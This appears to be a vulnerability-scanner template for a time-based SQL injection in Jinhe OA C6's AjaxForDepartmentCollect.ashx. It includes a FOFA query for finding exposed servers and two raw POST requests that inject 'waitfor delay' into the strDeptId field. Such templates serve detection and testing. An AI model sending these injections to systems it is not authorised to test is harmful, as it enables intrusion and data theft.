id: jinhe-oa-ajaxfordepartmentcollect-sqli
info:
  name: 金和OA AjaxForDepartmentCollect.ashx 组件 SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="金和网络-金和OA"
        金和网络作为专业信息化服务商，其金和OA C6版本的AjaxForDepartmentCollect.ashx组件存在SQL注入缺陷。攻击者可通过构造恶意请求向数据库注入特定指令，实现敏感数据提取（如管理员凭证、用户隐私数据）及服务器文件写入操作。在具备足够权限的场景下，该漏洞可能被用于部署后门程序并获取系统控制权。
  tags: 金和OA
http:
- raw:
  - |
    POST /c6/JHSoft.Web.CostControl/Collect/AjaxForDepartmentCollect.ashx HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    strType=getHistoryList&strDeptId=1; waitfor delay'0:0:5'--&strCollectType=Department&strYear=2012
  - |
    POST /c6/JHSoft.Web.CostControl/Collect/AjaxForDepartmentCollect.ashx HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    strType=getHistoryList&strDeptId=1; waitfor delay'0:0:8'--&strCollectType=Department&strYear=2012
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
